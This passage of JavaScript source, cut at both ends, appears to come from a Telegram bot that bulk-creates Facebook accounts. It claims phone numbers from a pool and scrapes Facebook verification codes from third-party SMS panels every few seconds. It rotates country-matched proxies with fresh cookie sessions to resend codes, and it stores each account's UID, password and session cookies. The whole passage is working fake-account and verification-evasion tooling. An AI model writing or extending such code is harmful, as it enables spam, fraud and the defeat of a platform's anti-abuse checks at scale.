      if (data === null) {
        if (throttledStatus) {
          const retryRaw = Number(throttledStatus.headers?.get?.('retry-after') || 0);
          const delaySec = Math.max(API_BLOCK_RETRY_SECONDS, Number.isFinite(retryRaw) ? Math.ceil(retryRaw) : 0);
          const st = panelRequestState.get(panelKey) || { blockedUntil: 0, lastScanAt: 0 };
          st.blockedUntil = Math.max(st.blockedUntil, Date.now() + delaySec * 1000);
          panelRequestState.set(panelKey, st);
          updatePanelById(panelKey, { api_last_error: `Provider rate limit (HTTP 429); retrying in ${delaySec}s` });
          return limit ? staleRows.slice(0, limit) : staleRows;
        }
        if (authFailed) {
          updatePanelById(panelKey, { api_last_error: 'Authentication failed' });
          return null;
        }
        return [];
      }

      let rawRows = _apiPathValue(data, panel.api_rows_path);
      if (!Array.isArray(rawRows)) rawRows = _apiPayloadRows(data);
      rawRows = rawRows.slice(0, API_MAX_ROWS);

      const numIdx = Number.isInteger(panel.number_col_idx) ? panel.number_col_idx : 2;
      const sndIdx = Number.isInteger(panel.sender_col_idx) ? panel.sender_col_idx : 3;
      const msgIdx = Number.isInteger(panel.message_col_idx) ? panel.message_col_idx : 5;
      const minLen = Math.max(numIdx, sndIdx, msgIdx) + 1;
      const fieldMap = {
        number: panel.api_number_field || '',
        sender: panel.api_sender_field || '',
        message: panel.api_message_field || '',
        timestamp: panel.api_timestamp_field || '',
        range: panel.api_range_field || '',
      };

      const results = [];
      for (let rowIdx = 0; rowIdx < rawRows.length; rowIdx++) {
        const vals = _apiRowValues(rawRows[rowIdx], numIdx, sndIdx, msgIdx, fieldMap);
        if (!vals || vals.length < minLen) continue;
        let ts = vals[0] ? _stripHtmlText(vals[0]) : '';
        const rng = vals[1] ? _stripHtmlText(vals[1]) : '';
        const number = vals[numIdx] ? _stripHtmlText(vals[numIdx]) : '';
        const sender = vals[sndIdx] ? _stripHtmlText(vals[sndIdx]) : '';
        const message = vals[msgIdx] ? _stripHtmlText(vals[msgIdx]) : '';
        if (!ts) ts = String(rawRows.length - rowIdx).padStart(12, '0');
        if (!number) continue;
        results.push({ ts, range: rng, number, sender, message, panelId: panelKey, panelName: panel.name });
      }
      results.sort((a, b) => String(b.ts).localeCompare(String(a.ts)));

      const patch = { api_last_error: '' };
      if (results.length > 0 && results[0].message !== undefined) {
        patch.last_sms_json = results[0];
      }
      updatePanelById(panelKey, patch);
      panelSmsCache.set(panelKey, { fetchedAt: Date.now(), rows: results });
      return limit ? results.slice(0, limit) : results;
    } catch (err) {
      const msg = err instanceof Error ? err.message : 'Request failed';
      updatePanelById(panelKey, { api_last_error: lastHttpStatus ? `HTTP ${lastHttpStatus}: ${msg}`.slice(0, 200) : msg.slice(0, 200) });
      return limit ? staleRows.slice(0, limit) : staleRows;
    }
  }

  async function panelFetchRawRow(panel) {
    if (!panel || !panel.stats_url) return [];
    const attempts = _apiRequestAttempts(panel);
    if (attempts.length === 0) return null;
    try {
      for (let i = 0; i < attempts.length; i++) {
        const res = await executePanelHttpAttempt(panel.id, panel.stats_url, attempts[i]);
        if (res.status === 429) {
          updatePanelById(panel.id, { api_last_error: 'Provider rate limit (HTTP 429)' });
          return [];
        }
        if (_apiResponseIsAuthError(res.status, res.payload)) continue;
        if (res.status < 200 || res.status >= 300 || res.payload === null) return [];
        let rows = _apiPathValue(res.payload, panel.api_rows_path);
        if (!Array.isArray(rows)) rows = _apiPayloadRows(res.payload);
        return rows.length > 0 ? rows[0] : [];
      }
      return null;
    } catch {
      return [];
    }
  }

  async function fetchAllActivePanelsSms(forceRefresh = false) {
    const panels = readPanelsStore().panels.filter((p) => p.active !== false);
    if (panels.length === 0) return { ok: false, noPanels: true, rows: [] };
    const batches = await Promise.all(
      panels.map((p) => panelFetchSms(p, null, forceRefresh).catch(() => []))
    );
    const merged = [];
    for (const rows of batches) {
      if (Array.isArray(rows)) merged.push(...rows);
    }
    merged.sort((a, b) => String(b.ts).localeCompare(String(a.ts)));
    return { ok: true, panelsCount: panels.length, rows: merged };
  }

  function smsRowKey(row) {
    return `${row.panelId || ''}|${String(row.number || '').replace(/\D/g, '')}|${String(row.ts || '')}|${String(row.message || '').slice(0, 80)}`;
  }

  async function runBackgroundPanelScanTick() {
    if (!running || panelScannerBusy) return;
    panelScannerBusy = true;
    try {
      const st = readSettings();
      const validMs = Math.max(1, Number(st.numberValidMinutes) || 10) * 60000;
      const now = Date.now();
      const activePanels = readPanelsStore().panels.filter((p) => p.active !== false);
      const lamixTok = resolveFbToolsLamixToken();
      const keys2oo9 = resolveFbTools2oo9Keys();
      const voltexUrl = resolveFbToolsVoltexUrl();
      if (activePanels.length === 0 && !lamixTok && keys2oo9.length === 0) return;

      const users = Object.values(readUsersMap());
      const anyAutoWatchPending = users.some((u) => readUserPending(u.id).some((p) => p && (p.autoVerify || p.poolNumberId)));
      if (!anyAutoWatchPending) return;

      const duePanels = activePanels.filter((p) => {
        const intervalMs = Math.max(3, Number(p.scan_interval) || 5) * 1000;
        const lastAt = Number(p.last_scanned_at) || 0;
        return now - lastAt >= intervalMs;
      });

      const allNewRows = [];
      const [panelBatches, lamixRes, two09Res] = await Promise.all([
        Promise.all(
          duePanels.map(async (panel) => {
            updatePanelById(panel.id, { last_scanned_at: now });
            return (await panelFetchSms(panel, null, true).catch(() => null)) || [];
          })
        ),
        lamixTok ? fetchLamixMessages(lamixTok, 80).catch(() => ({ ok: false, messages: [] })) : Promise.resolve({ ok: false, messages: [] }),
        keys2oo9.length > 0 ? fetch2oo9SuccessOtps(keys2oo9, voltexUrl).catch(() => ({ ok: false, otps: [] })) : Promise.resolve({ ok: false, otps: [] }),
      ]);
      for (const rows of panelBatches) {
        if (Array.isArray(rows) && rows.length > 0) allNewRows.push(...rows);
      }
      if (lamixRes?.ok && Array.isArray(lamixRes.messages)) {
        for (const row of lamixRes.messages) {
          const f = getLamixMsgFields(row);
          if (f.number && f.message) {
            allNewRows.push({
              panelId: 'lamix',
              panelName: 'Lamix Panel',
              number: f.number,
              sender: f.sender,
              message: f.message,
              time: String(f.ts || f.id),
            });
          }
        }
      }
      if (two09Res?.ok && Array.isArray(two09Res.otps)) {
        for (const row of two09Res.otps) {
          allNewRows.push({
            panelId: '2oo9',
            panelName: 'Server-1',
            number: row.number,
            sender: row.sender,
            message: row.message,
            time: String(row.ts || row.id),
          });
        }
      }
      if (allNewRows.length === 0) return;

      for (const u of users) {
        const pending = readUserPending(u.id);
        if (pending.length === 0) continue;
        const cfg = readUserConfig(u.id);
        const userCookie = readUserCookies(u.id);
        let changed = false;
        const remaining = [...pending];

        for (let idx = remaining.length - 1; idx >= 0; idx--) {
          const item = remaining[idx];
          if (!item || !item.phone) continue;
          // Respect number valid time window for auto-created numbers
          if (item.poolClaimedAt && now - Number(item.poolClaimedAt) > validMs) {
            if (item.poolNumberId) consumeClaimedNumber(item.poolNumberId);
            remaining.splice(idx, 1);
            changed = true;
            continue;
          }
          const cleanPhone = String(item.phone).replace(/\D/g, '');
          if (activeOtpVerifyPhones.has(cleanPhone)) continue;

          // Only background-auto-verify if this pending item was queued from FB Auto create (has poolNumberId or autoVerify) AND is not currently handled by an active run watcher
          const activeRun = activeRuns.get(u.id);
          if (activeRun?.running && activeRun.watchPhones?.has(cleanPhone)) continue;
          if (!item.autoVerify && !item.poolNumberId) continue;

          let matchedRow = null;
          let matchedCode = '';
          for (const row of allNewRows) {
            const key = smsRowKey(row);
            if (seenBackgroundSmsKeys.has(key)) continue;
            if (!phoneDigitsMatch(row.number, cleanPhone)) continue;
            const c = extractFbOtpFromSms(row.message);
            if (c) {
              matchedRow = row;
              matchedCode = c;
              break;
            }
          }
          if (!matchedRow || !matchedCode) continue;

          seenBackgroundSmsKeys.add(smsRowKey(matchedRow));
          if (seenBackgroundSmsKeys.size > 4000) {
            const iter = seenBackgroundSmsKeys.values();
            for (let k = 0; k < 1000; k++) {
              const v = iter.next();
              if (v.done) break;
              seenBackgroundSmsKeys.delete(v.value);
            }
          }

          activeOtpVerifyPhones.add(cleanPhone);
          try {
            const confirmRes = item.flow === 'recovery'
              ? await submitRecoveryOtpAndLogin({ ...item }, matchedCode, item.pass || cfg.password, cfg)
              : await performOtpConfirm({ ...item }, matchedCode, cfg, userCookie);
            if (confirmRes.status === 'OK') {
              const finalPass = confirmRes.pass || item.pass || cfg.password || '';
              storeUserAccount(u.id, {
                name: item.name,
                phone: item.phone,
                pass: finalPass,
                uid: confirmRes.uid,
                status: 'OK',
                confirmed: true,
                engine: item.flow === 'recovery' ? 'PC_CLONE_AUTO' : undefined,
                cookies: confirmRes.cookies,
              });
              if (item.poolNumberId) consumeClaimedNumber(item.poolNumberId);
              remaining.splice(idx, 1);
              changed = true;
              const uMap = readUsersMap();
              if (uMap[u.id]) {
                uMap[u.id].totalOk += 1;
                writeUsersMap(uMap);
              }
              const cstr = formatCookieHeader(confirmRes.cookies || {});
              await sendMessage(
                u.id,
                [
                  `✅ <b>FB AUTO-OTP VERIFIED!</b>`,
                  DIVIDER,
                  `👤 <b>Profile:</b> ${escapeHtml(item.name || 'FB User')}`,
                  `📱 <b>Number:</b> <code>+${escapeHtml(item.phone)}</code>  •  🔑 <b>OTP:</b> <code>${escapeHtml(matchedCode)}</code>`,
                  `🆔 <b>UID|Pass:</b> <code>${escapeHtml(confirmRes.uid)}|${escapeHtml(finalPass)}</code>`,
                  ``,
                  `<blockquote>🍪 <code>${escapeHtml(cstr.slice(0, 260))}${cstr.length > 260 ? '...' : ''}</code></blockquote>`,
                ].join('\n'),
                {
                  inline_keyboard: [
                    [
                      btnOk(`📤 OTP Send (PC Proxy)`, `otp:pc_send:${item.phone}`),
                      btnNav(`📡 Lamix OTP চেক`, `otp:check_lamix:${item.phone}`),
                    ],
                    [btnOk('📦 View Accounts', 'menu:accounts'), btnNav('⚡ FB Auto create', 'menu:fb_auto_create')],
                  ],
                }
              ).catch(() => {});
            } else if (confirmRes.status === 'RETRY') {
              remaining[idx] = confirmRes.item;
              changed = true;
            }
          } finally {
            activeOtpVerifyPhones.delete(cleanPhone);
          }
        }
        if (changed) writeUserPending(u.id, remaining);
      }
    } catch (err) {
      appendDebugLog(`[WARN] Panel scanner tick error: ${err instanceof Error ? err.message : String(err)}`);
    } finally {
      panelScannerBusy = false;
    }
  }

  function startPanelScanner() {
    if (panelScannerTimer) clearInterval(panelScannerTimer);
    panelScannerTimer = setInterval(() => {
      runBackgroundPanelScanTick().catch(() => {});
    }, 3000);
  }

  function stopPanelScanner() {
    if (panelScannerTimer) {
      clearInterval(panelScannerTimer);
      panelScannerTimer = null;
    }
  }

  // ── FB AUTO CREATE MENU (ADMIN NUMBER POOL + LIVE PANEL OTP) ──────────────
  async function renderFbAutoCreateMenu(chatId, uid, editMsgId, page = 0) {
    const st = readSettings();
    const user = readUsersMap()[uid];
    const isAdmin = isUserAdmin(user, st);
    const cfg = readUserConfig(uid);
    const countries = getCountryInventoryStats();
    const activePanelsCnt = readPanelsStore().panels.filter((p) => p.active !== false).length;
    const pwBadge = cfg.password && cfg.password.length >= 6 ? `🟢 Set (${cfg.password.length}c)` : `🔴 NOT SET`;
    const run = activeRuns.get(uid);

    let selCountry = countries.find((c) => c.id === Number(cfg.fb_create_country_id));
    if (!selCountry && countries.length > 0) {
      selCountry = countries.find((c) => c.available > 0) || countries[0];
      writeUserConfig(uid, { fb_create_country_id: selCountry.id });
    }

    const totalAvail = countries.reduce((s, c) => s + c.available, 0);
    const lines = [
      `⚡ <b>FB AUTO CREATE • AUTO OTP</b>`,
      DIVIDER,
      `🔒 <b>FB Password:</b> ${pwBadge}  •  🔍 <b>GQL Check:</b> ${cfg.precheck_gql !== false ? '🟢 ON' : '🔴 OFF'}`,
      `🌍 <b>Selected Country:</b> ${selCountry ? `<b>${escapeHtml(selCountry.name)}</b> (Available: <code>${selCountry.available}</code>)` : '<i>None configured yet</i>'}`,
      `📦 <b>Total Pool Stock:</b> <code>${totalAvail}</code> numbers across <code>${countries.length}</code> country(s)`,
      ``,
    ];

    if (run?.running) {
      lines.push(`⚡ <b>Active Run:</b> <code>${run.completed}/${run.total}</code> (✅${run.okCount} 🔐${run.pendingCount})`);
    } else if (countries.length === 0) {
      lines.push(`<blockquote>⚠️ No countries/numbers have been added by Admin yet. Please contact Support or check back shortly.</blockquote>`);
    } else if (selCountry && selCountry.available === 0) {
      lines.push(`<blockquote>⚠️ <b>${escapeHtml(selCountry.name)}</b> is currently out of stock. Select another country below or contact Support.</blockquote>`);
    } else {
      lines.push(`<blockquote>1️⃣ Select a <b>Country</b> below.\n2️⃣ Choose account count → bot claims fresh numbers from pool, creates FB accounts &amp; receives OTP automatically!</blockquote>`);
    }
    if (isAdmin && activePanelsCnt === 0) {
      lines.push(`\n<i>Admin Notice: 0 active OTP API Panels configured. Add one in Admin Panel → OTP API Panels.</i>`);
    }

    const rows = [];
    if (!cfg.password || cfg.password.length < 6) {
      rows.push([btnOk('🔒 Set FB Password First', 'set:pw')]);
    }

    const perPage = 6;
    const totalPages = Math.max(1, Math.ceil(countries.length / perPage));
    const safePage = Math.max(0, Math.min(page, totalPages - 1));
    const slice = countries.slice(safePage * perPage, safePage * perPage + perPage);

    for (let i = 0; i < slice.length; i += 2) {
      const row = [];
      for (const c of slice.slice(i, i + 2)) {
        const isSel = selCountry && c.id === selCountry.id;
        const label = `${isSel ? '✅ ' : ''}${c.name} (${c.available})`;
        const btnFn = c.available > 0 ? (isSel ? btnOk : btnNav) : btnBad;
        row.push(btnFn(label.slice(0, 32), `fbcreate:pick:${c.id}`));
      }
      rows.push(row);
    }

    if (totalPages > 1) {
      const navRow = [];
      if (safePage > 0) navRow.push(btnNav('◀️ Prev', `fbcreate:countries:${safePage - 1}`));
      navRow.push(btnNav(`Page ${safePage + 1}/${totalPages}`, `fbcreate:countries:${safePage}`));
      if (safePage + 1 < totalPages) navRow.push(btnNav('Next ▶️', `fbcreate:countries:${safePage + 1}`));
      rows.push(navRow);
    }

    if (selCountry && selCountry.available > 0) {
      rows.push([
        btnOk('⚡ Create 1', 'fbcreate:start:1'),
        btnOk('🔥 Create 3', 'fbcreate:start:3'),
        btnOk('🚀 Create 5', 'fbcreate:start:5'),
      ]);
      rows.push([
        btnOk('📦 Create 10', 'fbcreate:start:10'),
        btnNav('🔢 Custom Count', 'fbcreate:custom_count'),
      ]);
    }

    if (run?.running) {
      rows.push([btnBad('🛑 Stop Active Run', 'menu:stop')]);
    }

    const footerRow = [btnOk('🔄 Refresh', 'menu:fb_auto_create')];
    if (isAdmin) footerRow.push(btnNav('🌍 Manage Numbers', 'admin:countries'));
    footerRow.push(btnNav('⬅️ Main Menu', 'menu:home'));
    rows.push(footerRow);

    const txt = lines.join('\n');
    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function syncPanelOtpsForPending(chatId, uid) {
    const items = readUserPending(uid);
    if (items.length === 0) {
      await sendMessage(chatId, 'ℹ️ OTP Queue is currently empty.', {
        inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
      });
      return;
    }
    const fetchRes = await fetchAllActivePanelsSms(true);
    if (fetchRes.noPanels) {
      await sendMessage(chatId, '⚠️ No active OTP API Panel is configured right now. Contact Admin or use Manual OTP.', {
        inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
      });
      return;
    }

    const cfg = readUserConfig(uid);
    const userCookie = readUserCookies(uid);
    let verifiedCount = 0;
    let matchedCount = 0;
    const logs = [];
    const remaining = [...items];

    for (let idx = remaining.length - 1; idx >= 0; idx--) {
      const item = remaining[idx];
      let matchedCode = '';
      for (const row of fetchRes.rows) {
        if (!row.message) continue;
        if (!phoneDigitsMatch(row.number, item.phone)) continue;
        const c = extractFbOtpFromSms(row.message);
        if (c) {
          matchedCode = c;
          break;
        }
      }
      if (!matchedCode) continue;
      matchedCount += 1;
      const confirmRes = item.flow === 'recovery'
        ? await submitRecoveryOtpAndLogin({ ...item }, matchedCode, item.pass || cfg.password, cfg)
        : await performOtpConfirm({ ...item }, matchedCode, cfg, userCookie);
      if (confirmRes.status === 'OK') {
        verifiedCount += 1;
        const finalPass = confirmRes.pass || item.pass || cfg.password || '';
        storeUserAccount(uid, {
          name: item.name,
          phone: item.phone,
          pass: finalPass,
          uid: confirmRes.uid,
          status: 'OK',
          confirmed: true,
          cookies: confirmRes.cookies,
        });
        if (item.poolNumberId) consumeClaimedNumber(item.poolNumberId);
        remaining.splice(idx, 1);
        const usersMap = readUsersMap();
        if (usersMap[uid]) {
          usersMap[uid].totalOk += 1;
          writeUsersMap(usersMap);
        }
        const cstr = formatCookieHeader(confirmRes.cookies || {});
        logs.push(`✅ <code>+${escapeHtml(item.phone)}</code> → OTP <code>${escapeHtml(matchedCode)}</code>\n   <code>${escapeHtml(confirmRes.uid)}|${escapeHtml(finalPass)}|${escapeHtml(cstr.slice(0, 120))}</code>`);
      } else {
        logs.push(`⚠️ <code>+${escapeHtml(item.phone)}</code> → code <code>${escapeHtml(matchedCode)}</code> → ${escapeHtml(confirmRes.err || confirmRes.status)}`);
      }
    }
    writeUserPending(uid, remaining);

    await sendMessage(
      chatId,
      [
        `📡 <b>PANEL OTP SYNC COMPLETE</b>`,
        DIVIDER,
        `📥 <b>Messages Scanned:</b> <code>${fetchRes.rows.length}</code>`,
        `🎯 <b>Matched Pending:</b> <code>${matchedCount}</code>  •  ✅ <b>Verified:</b> <code>${verifiedCount}</code>`,
        logs.length > 0 ? `\n${logs.slice(0, 8).join('\n')}` : `\n<i>No matching new OTP found in active SMS panels yet.</i>`,
      ].join('\n'),
      {
        inline_keyboard: [
          [btnOk('📦 Accounts Vault', 'menu:accounts'), btnNav('🔐 OTP Queue', 'menu:otp')],
        ],
      }
    );
  }

  async function syncLamixOtpsForPending(chatId, uid) {
    const cfg = readUserConfig(uid);
    const lamixTok = resolveFbToolsLamixToken();
    if (!lamixTok) {
      await sendMessage(chatId, '⚠️ অটো OTP সার্ভার এখনো অ্যাডমিন সেট করেননি। অ্যাডমিনের সাথে যোগাযোগ করুন অথবা ম্যানুয়ালি OTP দিন।', {
        inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
      });
      return;
    }
    const items = readUserPending(uid);
    if (items.length === 0) {
      await sendMessage(chatId, 'ℹ️ OTP Queue is currently empty.', {
        inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
      });
      return;
    }
    const res = await fetchLamixMessages(lamixTok, 80);
    if (!res.ok) {
      await sendMessage(chatId, `❌ Server SMS fetch failed: <code>${escapeHtml(sanitizeProviderText(res.error || 'error'))}</code>`, {
        inline_keyboard: [[btnNav('⬅️ OTP Queue', 'menu:otp')]],
      });
      return;
    }
    const userCookie = readUserCookies(uid);
    let verifiedCount = 0;
    let matchedCount = 0;
    const logs = [];
    const remaining = [...items];

    for (let idx = remaining.length - 1; idx >= 0; idx--) {
      const item = remaining[idx];
      let matchedCode = '';
      for (const row of res.messages) {
        const f = getLamixMsgFields(row);
        if (!f.message) continue;
        if (!phoneDigitsMatch(f.number, item.phone)) continue;
        const c = extractFbOtpFromSms(f.message);
        if (c) {
          matchedCode = c;
          break;
        }
      }
      if (!matchedCode) continue;
      matchedCount++;
      const confirmRes = item.flow === 'recovery'
        ? await submitRecoveryOtpAndLogin({ ...item }, matchedCode, item.pass || cfg.password, cfg)
        : await performOtpConfirm({ ...item }, matchedCode, cfg, userCookie);
      if (confirmRes.status === 'OK') {
        verifiedCount++;
        const finalPass = confirmRes.pass || item.pass || cfg.password || '';
        storeUserAccount(uid, {
          name: item.name,
          phone: item.phone,
          pass: finalPass,
          uid: confirmRes.uid,
          status: 'OK',
          confirmed: true,
          engine: item.flow === 'recovery' ? 'PC_CLONE_AUTO' : undefined,
          cookies: confirmRes.cookies,
        });
        remaining.splice(idx, 1);
        const usersMap = readUsersMap();
        if (usersMap[uid]) {
          usersMap[uid].totalOk += 1;
          writeUsersMap(usersMap);
        }
        const cstr = formatCookieHeader(confirmRes.cookies || {});
        logs.push(`✅ <code>+${escapeHtml(item.phone)}</code> → OTP <code>${escapeHtml(matchedCode)}</code>\n   <code>${escapeHtml(confirmRes.uid)}|${escapeHtml(finalPass)}|${escapeHtml(cstr.slice(0, 120))}</code>`);
      } else {
        logs.push(`⚠️ <code>+${escapeHtml(item.phone)}</code> → code <code>${escapeHtml(matchedCode)}</code> → ${escapeHtml(confirmRes.err || confirmRes.status)}`);
      }
    }
    writeUserPending(uid, remaining);

    await sendMessage(
      chatId,
      [
        `📡 <b>SERVER-2 SMS OTP SYNC COMPLETE</b>`,
        DIVIDER,
        `📥 <b>Messages Scanned:</b> <code>${res.messages.length}</code>`,
        `🎯 <b>Matched Pending:</b> <code>${matchedCount}</code>  •  ✅ <b>Logged In:</b> <code>${verifiedCount}</code>`,
        logs.length > 0 ? `\n${logs.slice(0, 8).join('\n')}` : `\n<i>No matching new Facebook OTP found in server inbox yet.</i>`,
      ].join('\n'),
      {
        inline_keyboard: [
          [btnOk('📦 Accounts Vault', 'menu:accounts'), btnNav('🔐 OTP Queue', 'menu:otp')],
        ],
      }
    );
  }

  async function lookupPhoneOtpAcrossServers(phone, opts = {}) {
    const cleanPhone = String(phone || '').replace(/\D/g, '');
    const lamixTok = resolveFbToolsLamixToken();
    const keys2oo9 = resolveFbTools2oo9Keys();
    const voltexUrl = resolveFbToolsVoltexUrl();
    const forceFresh = opts.forceFresh !== false;

    const [lRes, res2, pRes] = await Promise.all([
      lamixTok ? fetchLamixMessages(lamixTok, 100, forceFresh).catch(() => ({ ok: false, messages: [] })) : Promise.resolve({ ok: false, messages: [] }),
      keys2oo9.length > 0 ? fetch2oo9SuccessOtps(keys2oo9, voltexUrl).catch(() => ({ ok: false, otps: [] })) : Promise.resolve({ ok: false, otps: [] }),
      fetchAllActivePanelsSms(forceFresh).catch(() => ({ ok: false, rows: [] })),
    ]);

    const matches = [];
    let lamixScannedCount = 0;
    let scannedCount = 0;

    if (lRes.ok && Array.isArray(lRes.messages)) {
      lamixScannedCount = lRes.messages.length;
      scannedCount += lRes.messages.length;
      for (const row of lRes.messages) {
        const f = getLamixMsgFields(row);
        if (!f.message || !phoneDigitsMatch(f.number, cleanPhone)) continue;
        const code = extractFbOtpFromSms(f.message);
        matches.push({
          key: `L:${f.id}`,
          isLamix: true,
          source: 'Lamix Panel',
          sender: f.sender || 'Lamix Panel',
          code: code || '',
          message: f.message,
          ts: f.ts || 0,
        });
      }
    }

    if (res2.ok && Array.isArray(res2.otps)) {
      scannedCount += res2.otps.length;
      for (const row of res2.otps) {
        if (!row.message || !phoneDigitsMatch(row.number, cleanPhone)) continue;
        const code = extractFbOtpFromSms(row.message);
        matches.push({
          key: `2O:${row.id}`,
          isLamix: false,
          source: 'Server-1',
          sender: sanitizeProviderText(row.sender) || 'Server-1',
          code: code || '',
          message: row.message,
          ts: 0,
        });
      }
    }

    if (pRes.ok && Array.isArray(pRes.rows)) {
      scannedCount += pRes.rows.length;
      for (const row of pRes.rows) {
        if (!row.message || !phoneDigitsMatch(row.number, cleanPhone)) continue;
        const code = extractFbOtpFromSms(row.message);
        const tsNum = row.ts ? Date.parse(String(row.ts)) || 0 : 0;
        matches.push({
          key: `P:${smsRowKey(row)}`,
          isLamix: false,
          source: sanitizeProviderText(row.panelName || row.sender) || 'OTP Panel',
          sender: sanitizeProviderText(row.sender || row.panelName) || 'OTP Panel',
          code: code || '',
          message: row.message,
          ts: tsNum,
        });
      }
    }

    matches.sort((a, b) => {
      if (Boolean(b.code) !== Boolean(a.code)) return b.code ? 1 : -1;
      if (b.isLamix !== a.isLamix) return b.isLamix ? 1 : -1;
      return (b.ts || 0) - (a.ts || 0);
    });

    const lamixMatch = matches.find((m) => m.isLamix && m.code) || matches.find((m) => m.isLamix) || null;
    const best = lamixMatch || matches[0] || null;
    return {
      ok: Boolean(lRes.ok || res2.ok || pRes.ok),
      lamixConfigured: Boolean(lamixTok),
      lamixOk: Boolean(lRes.ok),
      found: Boolean(best),
      isLamix: Boolean(best?.isLamix),
      source: best?.source || '',
      sender: best?.sender || '',
      code: best?.code || '',
      message: best?.message || '',
      ts: best?.ts || 0,
      lamixMatch,
      lamixScannedCount,
      scannedCount,
      matches,
    };
  }

  async function triggerAccountOtpAndWatchLamix(chatId, uid, phone, opts = {}) {
    const cleanPhone = String(phone || '').replace(/\D/g, '');
    if (!cleanPhone) return;
    const cfg = readUserConfig(uid);
    const userCookie = readUserCookies(uid);
    const proxyPool = getEffectiveProxyPool(uid);
    const pendingList = readUserPending(uid);
    let pendingItem = pendingList.find((p) => String(p.phone || '').replace(/\D/g, '') === cleanPhone) || null;
    const accountItem = readUserAccounts(uid).find((a) => String(a.number || '').replace(/\D/g, '') === cleanPhone) || null;

    const det = detectCountryFromNumber(`+${cleanPhone}`, cfg.cc, pendingItem?.country || '');
    const iso = pendingItem?.iso || (det?.iso && det.iso !== '??' ? det.iso : getCountryInfo(cfg.cc)[1]);
    const countryName = pendingItem?.country || det?.name || getCountryInfo(cfg.cc)[0];
    const displayName = pendingItem?.name || accountItem?.name || 'FB Account';

    const selectRotatedProxy = (idxSeed = 0) => {
      const raw = proxyPool.length > 0
        ? selectSmartProxy(proxyPool, idxSeed, new Set(), 'rotate', cfg.proxy || pendingItem?.rawProxy || null, iso)
        : (pendingItem?.rawProxy || cfg.proxy || null);
      if (!raw) return { raw: null, url: null, isoApplied: iso, sessionId: '' };
      const adapted = adaptProxyForSession(raw, {
        iso,
        autoCountry: cfg.auto_proxy_country !== false,
        refreshSession: true,
        forcedSessionId: crypto.randomBytes(6).toString('hex'),
      });
      return { raw, url: adapted.url || raw, isoApplied: adapted.isoApplied || iso, sessionId: adapted.sessionId || '' };
    };

    const px1 = selectRotatedProxy(Number(pendingItem?.resendCount || 0) + 1);
    const initMsg = await sendMessage(
      chatId,
      [
        `📤 <b>PC CLONE OTP SEND (CLEAN COOKIES + PROXY)</b>`,
        DIVIDER,
        `📱 <b>Number:</b> <code>+${escapeHtml(cleanPhone)}</code> [${isoToFlag(iso)} <b>${escapeHtml(iso)}</b>]`,
        `🌐 <b>Fresh Proxy:</b> <code>${escapeHtml(px1.url ? `${px1.isoApplied || iso}${px1.sessionId ? ` • ssid:${escapeHtml(px1.sessionId.slice(0, 6))}` : ''}` : 'Direct')}</code>`,
        `🍪 <b>Cookies:</b> <code>Cleared &amp; Fresh Session</code>`,
        `⏳ OTP রিকোয়েস্ট পাঠানো হচ্ছে এবং সাথে সাথে <b>Lamix Panel</b> লাইভ চেক করা হবে...`,
      ].join('\n')
    );
    const statusMsgId = initMsg.ok && initMsg.result?.message_id ? initMsg.result.message_id : null;
    const renderUpdate = async (txt, kb) => {
      if (statusMsgId) return editMessage(chatId, statusMsgId, txt, kb);
      return sendMessage(chatId, txt, kb);
    };

    // Snapshot pre-existing SMS keys so we can tell when a brand-new resend arrives in Lamix Panel
    const preLookup = await lookupPhoneOtpAcrossServers(cleanPhone, { forceFresh: true }).catch(() => ({ matches: [] }));
    const preKeys = new Set((preLookup.matches || []).map((m) => m.key));

    let sendRes = { ok: false, reason: 'not started', via: '', resendCount: Number(pendingItem?.resendCount || 0) };
    let liveHit = null;
    let isBrandNewHit = false;
    let lastLookup = null;

    const findFreshHit = (lookupRes) => {
      if (!lookupRes?.matches?.length) return null;
      return (
        lookupRes.matches.find((m) => m.isLamix && !preKeys.has(m.key) && m.code) ||
        lookupRes.matches.find((m) => !preKeys.has(m.key) && m.code) ||
        lookupRes.matches.find((m) => !preKeys.has(m.key)) ||
        null
      );
    };

    const useConfirmFormFirst = !opts.forcePc && pendingItem && pendingItem.flow !== 'recovery' && pendingItem.confirm_url;

    if (useConfirmFormFirst) {
      const r1 = await performOtpResendOnce({ ...pendingItem }, cfg, userCookie, {
        proxiesPool: proxyPool,
        rotateProxy: proxyPool.length > 0,
        proxyIndex: Number(pendingItem.resendCount || 0) + 1,
      }).catch((e) => ({ ok: false, reason: e instanceof Error ? e.message : 'resend error' }));

      if (r1.alreadyConfirmed) {
        const finalPass = pendingItem.pass || cfg.password || '';
        storeUserAccount(uid, {
          name: displayName,
          phone: cleanPhone,
          pass: finalPass,
          uid: r1.uid,
          status: 'OK',
          confirmed: true,
          cookies: r1.cookies,
        });
        writeUserPending(uid, readUserPending(uid).filter((p) => String(p.phone || '').replace(/\D/g, '') !== cleanPhone));
        appendUserLog(uid, `OTP SEND AUTO-CONFIRMED +${cleanPhone} -> UID ${r1.uid}`);
        await renderUpdate(
          `✅ <b>Account Verified!</b>\n📱 <b>Number:</b> <code>+${escapeHtml(cleanPhone)}</code>\n🆔 <b>UID|Pass:</b> <code>${escapeHtml(r1.uid)}|${escapeHtml(finalPass)}</code>`,
          {
            inline_keyboard: [
              [btnOk('📤 OTP Send (PC Proxy)', `otp:pc_send:${cleanPhone}`), btnNav('📡 Lamix OTP চেক', `otp:check_lamix:${cleanPhone}`)],
              [btnOk('📦 Accounts Vault', 'menu:accounts'), btnNav('🔐 OTP Queue', 'menu:otp')],
            ],
          }
        );
        return;
      }
      if (r1.ok && r1.item) {
        pendingItem = r1.item;
        pendingItem.autoVerify = true;
        upsertUserPending(uid, pendingItem);
        sendRes = {
          ok: true,
          via: r1.via || 'confirm/resend',
          resendCount: Number(r1.resendCount || pendingItem.resendCount || 1),
          proxyUsed: Boolean(r1.proxyUsed),
          proxyTag: r1.proxyIso || iso,
          item: pendingItem,
        };
        // Wait 4.2s checking Lamix right after confirm-page resend; if not received yet, escalate to PC Clone!
        for (let k = 0; k < 3; k++) {
          await new Promise((r) => setTimeout(r, 1400));
          lastLookup = await lookupPhoneOtpAcrossServers(cleanPhone, { forceFresh: true }).catch(() => null);
          const fHit = findFreshHit(lastLookup);
